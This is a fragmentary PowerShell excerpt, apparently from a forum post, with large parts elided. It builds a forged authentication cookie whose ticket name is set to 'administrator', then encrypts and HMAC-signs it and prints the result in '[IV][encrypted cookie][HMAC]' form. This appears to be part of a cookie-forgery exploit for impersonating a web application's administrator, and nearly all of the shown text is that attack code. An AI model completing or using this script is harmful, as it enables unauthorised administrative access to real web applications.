...
function _Copmpute-Hmac {
	      ...
	      $hmac =  _Hmac-Factory $key_arr $hmac_type;
...
#edited: 
...
$ticketName = $cookie_helper.SetTicketName("administrator");
$ticketData = $cookie_helper.SetTicketData("Web Users");
write-output "New user as ticketName: $ticketName";
write-output "ticketData: $ticketData";
...
write-output "New decrypted cookie: $new_cookie";                
...
write-output "[IV][encrypted cookie][HMAC]: $encrypted_hmac";
